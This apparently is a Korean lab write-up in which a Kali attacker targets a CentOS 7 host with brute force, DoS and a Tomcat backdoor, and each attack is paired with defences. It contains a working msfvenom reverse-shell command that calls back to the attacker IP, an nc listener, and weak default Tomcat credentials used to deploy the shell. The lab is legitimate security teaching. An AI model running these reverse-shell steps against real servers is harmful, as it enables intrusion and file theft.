# Attacker OS : kali-linux-2025
# Attacker IP : 192.168.70.199/24
# Victim OS : Centos 7
# Victim IP : 192.168.70.101/24

---

## 공격기법: Brute Force Attack (무차별 대입 공격)
### 공격툴: HUB(device), nmap&hydra in kali-linux-2025
#### nmap -T3 --open 192.168.70.0/24 \
![image](https://github.com/user-attachments/assets/2e7a1b7a-45b3-429a-8cf4-7612252f7bb9)

## 대응방법: IDS(snort), IPS(fail2ban, port-security)
### 방어툴1: IPS(port-security)
### 방어툴2: IPS(fail2ban)
### 방어툴3: IDS(snort)

---

## 공격기법: DOS공격
### 공격툴: slowhttp in kali-linux-2025
## 대응방법: fault tolerence
### 방어툴: k8s의 replicaset 기능 

---

## 공격기법: Backdoor
### 공격툴: msfvenom in kali-linux-2025
## tomcat 최초 설치 후 manager 계정의 비밀번호는 취약하다
#### gedit /etc/tomcat/tomcat-users.xml 
![image](https://github.com/user-attachments/assets/88750f8e-1902-4635-a111-c88233eb1917)

## kali-linux-2025 에서 reverse_shell file 생성
#### msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.70.199 LPORT=4444 -f war > shell.war
![image](https://github.com/user-attachments/assets/2bdca0de-bc19-4417-99cd-8d26632075db)

## kali 에서 4444포트 리스닝으로 설정(shell.war파일 실행되면 탐지된다)
#### nc -lvnp 4444
![image](https://github.com/user-attachments/assets/9c245899-cf96-4695-a724-51cbfd6becd9)

## USB로 타겟노드에 shell.war 파일을 저장
![image](https://github.com/user-attachments/assets/aac11660-e2fe-4977-bbff-3f17d6824b55)

## 타겟노드에서 admin/adminadmin으로 tomcat manager로 로그인(비밀번호 취약하기 때문에 접근용이함)
![image](https://github.com/user-attachments/assets/a3765c2d-75f1-48e2-b0b9-8e1413792905)

## tomcat manager 로그인된 상태로 shell.war 파일을 배포하기
![image](https://github.com/user-attachments/assets/f9b4e736-1ee2-4c1f-a6b1-99492b8b1bf5)
![image](https://github.com/user-attachments/assets/d6399ac1-e74c-4f5f-ace4-f52cc298451f)

## 타겟노드에서 배포된 shell.war 파일 실행하기
#### http://192.168.70.101:8080/shell/
![image](https://github.com/user-attachments/assets/5eaefa5f-012d-40c1-a74f-b02a2c15a038)

## kali에서 shell.war 파일 실행이 감지됐다. 주요 파일들을 추출해볼 수 있다.
![image](https://github.com/user-attachments/assets/aa85da4c-745a-4e27-9180-6bf275320061)

## 타겟노드에서는 포트번호를 알지 못하면 탐지되기 어렵다
![image](https://github.com/user-attachments/assets/b7879ddb-a4cf-474d-90ac-377543e4ddd6)

## 대응방법 1: tomcat manager password 생성시 복잡성을 고려하고 생성하기. shell.war 파일을 업로드하려면 tomcat manager로 로그인해야하기 때문이다.
![image](https://github.com/user-attachments/assets/f9467707-9135-4f20-97b1-bc2bc4dd143b)

## 대응방법 2-1: 소유자와 사용권한 변경하기
![image](https://github.com/user-attachments/assets/fe3689aa-3216-4f34-9efb-8e6a35ff1dce)

## 대응방법 2-2: 톰캣 웹서버를 평소에는 chattr +i /usr/share/tomcat/webapps/ 설정해서 수정 못하도록 하기
![image](https://github.com/user-attachments/assets/b48c595f-3684-4d9b-9f47-7bc358e04a88)

## 대응방법 3: 외부 USB를 함부로 장착하지 못하도록 외부디스크를 인식하면 차단하는 방식의 보안프로그램 설치 필요.



